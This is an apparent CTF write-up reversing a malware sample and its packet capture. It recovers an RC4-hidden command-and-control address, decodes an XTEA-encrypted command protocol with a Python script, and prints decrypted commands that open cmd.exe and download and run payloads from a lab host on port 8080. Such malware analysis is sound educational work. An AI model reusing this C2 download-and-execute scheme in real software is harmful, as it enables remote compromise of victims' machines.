---
title: Rev Capture Point 2025
published: 2025-04-22
description: This is first challenge Rev I solved in Malware category 
tags: [Example, Video]
category: Examples
draft: true
---

# REV CapturePoint
>Solver: kAiZ3n
>Artifact : sample.exe and capture.pcap

First I see the program was using ws_32.dll to open socket connect with TCP
```
 v15 = socket(2, 1, 6);
```
```
 ModuleHandleW = GetModuleHandleW(0LL);
      v5 = GetModuleHandleW(0LL);
      ResourceA = FindResourceA(v5, "DATA", "CONFIG");
      v7 = ResourceA;
      if ( ResourceA
        && (v8 = SizeofResource(ModuleHandleW, ResourceA), (Resource = LoadResource(ModuleHandleW, v7)) != 0LL)
        && (v10 = LockResource(Resource)) != 0LL
        && v8 >= 0x42 )
      {
        v11 = malloc(v8);
        memset(v11, 0, v8);
        memcpy(v11, v10, v8);
        sub_140001750(v11, v8);
        cp = (char *)v11;
```
Here is The program was looking Source for "cp" on itself PEs file with the size of resource == 0x42 we'll use PEbear and HxD to look up exactly value it 
and it seems ipaddr and port to open socket was be obfuscated in cp variable and this func for handling 
![image](/images/hackmd/HypI4ucTkg.png)
in the key logic in this func , which'll create key and decrypt RC4
Here is func created key 
![image](/images/hackmd/ByUSrd9aJl.png)
```
def generate_key(data: bytes) -> bytes:
    return bytes([b ^ 0x2F for b in data])

# Test
input_data = b"xg`nakxgj}jf|bvbn|{j}"

key = generate_key(input_data)
print("Generated Key:", key)


Generated Key: b'WHOANDWHEREISMYMASTER'
```
and then we'll find data of "CONFIG" resouce to decrypt it with key above in PE file
```
*(_WORD *)hKey.sa_data = htons(*((_WORD *)cp + 32));
*(_DWORD *)&hKey.sa_data[2] = inet_addr(cp);
```
After Decrypting I got Ip address of attacker 
- ip.addr == 192.168.138.67
- port == cp[32] == "P" == to int == 80
![image](/images/hackmd/Sy8gdv9TJg.png)
Oke the next step I'll start proccessing pcap file with available details also we looked up 
![image](/images/hackmd/HkLq_wq6kg.png)
I recognized attacker sended out a few encrypted payload to client and processed it as commandHandler program . ThereFore I looked up API call recv from ws_32.dll windows to check it out
At here 
![image](/images/hackmd/HJNUtPqa1e.png)
the payload sended out in sub_1400020C0()
and then I'll analysis sub_1400020C0 function
![image](/images/hackmd/Hk1AYD9p1e.png)
the key logic in here the payload'll be decrypted with base64 and then it'll compare the first char if it == "D" which slipt command with delitermine "|" and then store them in v10 and the next in v11
Otherwise if it == "E" which decrypted one more with payload'll be send it in sub_1400019F0 (I'll replace sub_1400019F0 to CommandHandler for convinient with my next process)
and after handling it'll split the same with condition of char "D"
the logic code of commandHandler func as decrypting use XXTEA alogrithm
Because the payload 1 was be recognized as "D" condition so it use v10 = "KEYEXCH" and v11 = "ENCRYPTTRAFFIK07" and this case'll save data of qword_1400086F0 as key for decrypting in CommandHandler
![image](/images/hackmd/ryuonwc6yl.png)
we'll use it to decrypting with "E" condition 
I wrote script for decrypting 
```
import base64
import struct
COMMANDS = {
        222930539: "SAVE_DATA",
        691556979: "RUN_PROCESS",
        -1988075216: "WRITE_PIPE",
        697129745: "CLEANUP",
        224984815: "CUSTOM_ACTION",
        1354554278: "READ_FILE",
        224984815 : "DOWNEXEC"
    }
def xtea_decrypt(key, block):
    v0, v1 = struct.unpack('>2L', block)
    delta = 0x9E3779B9
    mask = 0xFFFFFFFF
    sum = (delta * 32) & mask
    for _ in range(32):
        v1 = (v1 - ((v0 << 4 ^ v0 >> 5) + v0 ^ sum + key[sum >> 11 & 3])) & mask
        sum = (sum - delta) & mask
        v0 = (v0 - ((v1 << 4 ^ v1 >> 5) + v1 ^ sum + key[sum & 3])) & mask
    return struct.pack('>2L', v0, v1)

def decrypt_gorillabot_data(encrypted_data, keystream):
    key = [struct.unpack('>L', keystream[i:i+4])[0] for i in range(0, 16, 4)]
    decrypted_data = b''
    for i in range(0, len(encrypted_data), 8):
        decrypted_data += xtea_decrypt(key, encrypted_data[i:i+8])
    return decrypted_data.rstrip(b'\x00')
def decode_input(input_str):
    try:
        decoded = base64.b64decode(input_str)
        
        # Kiểm tra định dạng
        if decoded[0] == ord('D'):
            return decoded[1:]
        elif decoded[0] == ord('E'):
            keystream = b'ENCRYPTTRAFFIK07'[:16]
            result = decrypt_gorillabot_data(decoded[1:],keystream)
            return result
        else:
            return "Invalid format"
    except Exception as e:
        return f"Error: {e}"
inputs = [
    "REtFWUVYQ0h8RU5DUllQVFRSQUZGSUswNw==",
    "RS1J1SxUJcq0y6CmpvlFHTUxUub0NrsRb96TEwoWI5GFR0RM/jkk9ZA=",
    "RXUBvuF7XzYu3La0O/fiqLx3nHSXTn7Ghw==",
    "RT6v61YF2uq+B5OOcTNe7h8=RT6v61YF2uq+B5OOcTNe7h8=",
    "RSPPpIhlKGAsCmnkR3kD+uD5g30DH199VGWitl4BFgiF7LhZMn4GWFBrg40R9ty2p1pAStWd399I==",
    "RSPPpIhlKGAsCmnkR3kD+uD5g30DH199VGWitl4BFgiF7LhZMn4GWFDRIh1agXJSpaR7Fxcm+fFl==",
   ]
def ror(value, bits, width=32):
    """Xoay phải (ROR) giá trị 'value' đi 'bits' bit trên 'width' bit."""
    return ((value >> bits) | (value << (width - bits))) & ((1 << width) - 1)

def calculate(input_string: str) -> int:
    v10 = list(input_string.encode()) 
    v13 = 0 
    v15 = len(v10)  
    
    while v15 > 0:
        v16 = v10.pop(0) 
        v13 = v16 + ror(v13, 13)
        v15 -= 1 

    return v13
for idx, input_str in enumerate(inputs):
    print(f"Input {idx + 1}:")
    result = decode_input(input_str)
    print(f"  Decoded: {result}\n")
```
Artifact after decrypting
Input 1:
  Decoded: ['KEYEXCH', 'ENCRYPTTRAFFIK07']

Input 2:
  Decoded: b'CMDSHEL|C:\\windows\\system32\\cmd.exe'

Input 3:
  Decoded: b'EXECCMD|cd %temp%\n'

Input 4:
  Decoded: b'EXITSHEL'

Input 5:
  Decoded: b'DOWNEXEC|http://192.168.138.67:8080/data.png|DEKRYPT|0'

Input 6:
  Decoded: b'DOWNEXEC|http://192.168.138.67:8080/data.txt|DEKRYPT|1'
 
Amazing when it's using port 8080 to download the payload else 
when it run in "DOWNEXEC" case 

![image](/images/hackmd/Hk7sRvcpJg.png)
oke let'go,we look at the PCAP file a bit
![image](/images/hackmd/SJW6i39akg.png)
As with Payload, I was Decrypt, now come back to source code IDA
the strings'll continuely split with v22 = "DEKRYPT" , v25 ="0" (if input 5 and = "1" with input 6) and then it'll convert bytes to UNICODE and v25 = v22 = "DEKRYPT" and sub_140002890() will continue handling the payload data.png or data.txt I follow to this function and I recoginzed the meaning of the last char of input for "0/1"
if it is "0" which will download file and save in folder **%temp%\kri<randomstring>.tmp** or it is "1" which will  download file and run this file  with ```<namefile> "DEKRYPT"```
I'll download file data.txt with parameter "1" to figure it out doing
The file is PEs be written by C program 
![image](/images/hackmd/ryb8-_qa1g.png)
At main code it using argv[1] to convert Unicode and send it in sub_140001260
![image](/images/hackmd/HkaO-_9pJx.png)
at the key logic of this func is using AES algorithm with key was using the hash algorithm '**sha256 of"DEKRYPT"**' from **argv[1]** ran with the first PE with CreateProcess at v27 variable 
    ![image](/images/hackmd/rJTyGu5p1g.png)
and the encrypted data is data.png (data.png I got it from pcap tcp stream of ip.addr==192.168.138.67 and tcp.port==8080)
oke After grabs logic code I'll handle data.png decrypt it with key "DEKRYT" and got flag 
nai xừ :D
![image](/images/hackmd/HkCyQu5aJl.png)
